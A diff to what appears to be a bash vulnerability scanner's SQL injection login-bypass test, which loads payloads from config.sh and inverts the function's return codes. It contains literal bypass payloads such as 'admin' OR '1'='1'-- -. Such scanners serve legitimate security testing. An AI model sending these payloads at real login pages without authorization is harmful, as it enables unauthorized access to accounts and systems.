@@ -196,6 +196,9 @@ test_login_sqli() {
     # Step 4: Test SQL injection login
     
     # Common SQL injection payloads for login bypass
+    source config.sh
+    
+
     payloads=(
         "admin' OR '1'='1'-- -"
         "administrator'--"
@@ -207,7 +210,7 @@ test_login_sqli() {
     )
     
     vulnerable=0
-    for payload in "${payloads[@]}"; do
+    for payload in "${loginPayloads[@]}"; do
     # Encode payload for URL
         echo "    Trying payload: $payload"
         
@@ -268,10 +271,10 @@ test_login_sqli() {
         echo -e "${RED}[VULNERABLE] ⚠️  VULNERABLE TO SQL INJECTION LOGIN BYPASS!${NC}"
         echo -e "    URL: ${YELLOW}$base_url${NC}"
         echo -e "    Successful payload: ${YELLOW}$payload${NC}"
-        return 0
+        return 1
     else
         echo "[-] No SQL injection vulnerability detected"
-        return 1
+        return 0
     fi
 }
 
